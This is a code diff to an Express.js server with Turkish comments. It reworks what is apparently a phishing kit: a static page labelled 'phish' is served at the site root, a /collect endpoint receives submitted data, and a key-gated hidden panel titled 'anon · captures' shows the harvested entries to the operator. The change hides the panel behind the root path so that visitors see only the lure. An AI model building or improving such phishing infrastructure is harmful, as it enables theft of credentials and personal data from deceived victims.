@@ -11,10 +11,10 @@ app.set("trust proxy", true);
 app.use(express.json({ limit: "1mb" }));
 app.use(express.urlencoded({ extended: true }));
 
-/* ---------- gizli panel ---------- */
-app.get("/anon", (req, res) => {
+/* ---------- panel: /?k=anon  ·  phish: / ---------- */
+app.get("/", (req, res, next) => {
   const k = req.query.k || req.headers["x-key"] || "";
-  if (k !== KEY) return res.status(404).send("Not Found");
+  if (k !== KEY) return next();
 
   let lines = [];
   try {
@@ -42,7 +42,7 @@ app.get("/anon", (req, res) => {
       </tr>`;
   }).join("");
 
-  res.send(`<!DOCTYPE html><html><head><meta charset="utf-8">
+  return res.send(`<!DOCTYPE html><html><head><meta charset="utf-8">
 <title>anon · captures</title>
 <style>
 body{font-family:ui-monospace,Menlo,Consolas,monospace;background:#0a0e14;color:#d6d8dd;margin:0;padding:20px;font-size:12px}
@@ -99,14 +99,14 @@ app.post("/collect", (req, res) => {
   res.json({ ok: true });
 });
 
+/* ---------- statik phish sayfasi ---------- */
+app.use(express.static(path.join(__dirname, "public")));
+
 function esc(s) {
   return String(s == null ? "" : s).replace(/[&<>"']/g, c => ({
     "&":"&amp;","<":"&lt;",">":"&gt;",'"':"&quot;","'":"&#39;"
   }[c]));
 }
-
-/* ---------- statik dosyalar (en sonda) ---------- */
-app.use(express.static(path.join(__dirname, "public")));
 
 app.listen(PORT, () => {
   console.log("listening on " + PORT);
